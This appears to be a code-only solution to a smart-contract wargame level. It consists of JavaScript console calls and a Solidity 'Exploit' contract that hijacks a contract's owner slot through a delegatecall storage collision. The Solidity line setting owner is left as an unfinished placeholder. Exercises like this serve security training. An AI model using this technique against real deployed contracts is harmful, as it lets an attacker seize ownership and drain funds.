```javascript
await contract.setFirstTime(web3.utils.hexToNumberString(YOUR_ATTACK_CONTRACT_ADDRESS))
```


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Exploit {
    
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    function setTime(uint256 _time) public  {
        owner = //Your address goes here
    }
    
}

```

```javascript
await contract.setFirstTime(0)
```